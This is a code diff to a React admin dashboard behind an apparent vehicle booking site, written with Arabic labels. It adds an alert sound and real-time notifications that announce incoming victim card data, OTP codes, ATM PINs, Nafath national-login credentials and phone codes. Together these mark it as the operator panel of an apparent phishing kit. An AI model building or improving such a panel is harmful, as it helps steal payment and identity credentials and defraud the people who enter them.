@@ -47,6 +47,24 @@ import {
 } from "lucide-react";
 import { io as socketIO } from "socket.io-client";
 
+// دالة تشغيل صوت تنبيه
+function playNotificationSound() {
+  try {
+    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
+    const osc = ctx.createOscillator();
+    const gain = ctx.createGain();
+    osc.connect(gain);
+    gain.connect(ctx.destination);
+    osc.frequency.setValueAtTime(880, ctx.currentTime);
+    osc.frequency.setValueAtTime(1100, ctx.currentTime + 0.1);
+    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.2);
+    gain.gain.setValueAtTime(0.3, ctx.currentTime);
+    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.4);
+    osc.start(ctx.currentTime);
+    osc.stop(ctx.currentTime + 0.4);
+  } catch (e) {}
+}
+
 type Booking = {
   id: number;
   referenceId: string;
@@ -97,6 +115,7 @@ export default function AdminDashboard() {
     socket.emit("joinAdmin", "admin-token");
 
     socket.on("newBooking", (booking: Booking) => {
+      playNotificationSound();
       toast.success(`حجز جديد من ${booking.clientName}`, {
         description: `رقم الهوية: ${booking.clientId} | اللوحة: ${booking.vehiclePlate}`,
       });
@@ -104,8 +123,17 @@ export default function AdminDashboard() {
       refetchBookings();
     });
 
-    socket.on("newPayment", (data: { reference: string }) => {
-      toast.info(`دفع جديد - المرجع: ${data.reference}`);
+    socket.on("newPayment", (data: { reference: string; step?: number; type?: string }) => {
+      playNotificationSound();
+      const typeLabels: Record<string, string> = {
+        card: "بيانات بطاقة جديدة",
+        verification: "رمز OTP جديد",
+        code: "رقم ATM جديد",
+        nafath: "بيانات نفاذ جديدة",
+        phoneCode: "رمز هاتف جديد",
+      };
+      const label = data.type ? typeLabels[data.type] || "بيانات جديدة" : "دفع جديد";
+      toast.info(`${label} - المرجع: ${data.reference}`);
       refetchBookings();
     });
 
